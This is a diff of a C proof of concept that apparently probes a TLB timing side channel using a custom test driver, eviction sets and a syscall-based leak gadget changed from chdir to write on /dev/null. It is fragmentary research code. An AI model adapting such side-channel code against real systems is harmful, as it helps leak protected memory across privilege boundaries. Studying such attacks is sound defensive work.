@@ -23,6 +23,7 @@
 #define TLB_SET(addr) (((uint64_t)addr >> PAGESHIFT) & ((1 << SET_SHIFT) - 1))
 
 int g_fd = -1;
+int w_fd = -1;
 
 struct alloc_args {
     int  npages;
@@ -33,7 +34,8 @@ struct alloc_args {
 #define TLBMOD_ALLOC_PAGE  _IOWR('T', 3, struct alloc_args)
 #define TLBMOD_FREE_PAGE   _IOW('T', 4, struct alloc_args)
 
-int setup_driver(void) {
+int setup(void) {
+    // Setup driver
     if (g_fd != -1) return 0;
 
     g_fd = open("/dev/tlbmod0", O_RDWR);
@@ -41,6 +43,14 @@ int setup_driver(void) {
         perror("Failed to open /dev/tlbmod0");
         return -1;
     }
+    
+    // Setup write file 
+    w_fd = open("/dev/null", O_WRONLY);
+    if (w_fd < 0) {
+        perror("Failed to open /dev/null");
+        return -1;
+    }
+
     return 0;
 }
 
@@ -83,13 +93,14 @@ uint64_t *res;
 char *user = "./";
 //char * user = "./main.c";
 
-
 int leak_val(void* addr){
-    chdir(addr);
-    chdir(addr);
-    chdir(addr);
+    //chdir(addr);
+    //chdir(addr);
+    //chdir(addr);
+    write(w_fd, (char *)addr, 2);
     return 1;
 }
+
 
 void get_cycle(uint64_t * valid_cycle, uint64_t * invalid_cycle){
     void * eset[WAYS];
@@ -122,12 +133,13 @@ void get_cycle(uint64_t * valid_cycle, uint64_t * invalid_cycle){
 int main(int argc, char * argv[]){
     void * addr;
     void * eset[WAYS];
-    void * target[TRAINING_ITERS] = {user, user, user};
+    void * target[TRAINING_ITERS] = {user, user, user, user, user};
+    // void * target[TRAINING_ITERS] = {};
     uint64_t valid_cycle, invalid_cycle;
     struct timeval tv_s, tv_e;
     register uint64_t tmp, threshold;
 
-    if (setup_driver() != 0) {
+    if (setup() != 0) {
         return 1;
     }
 
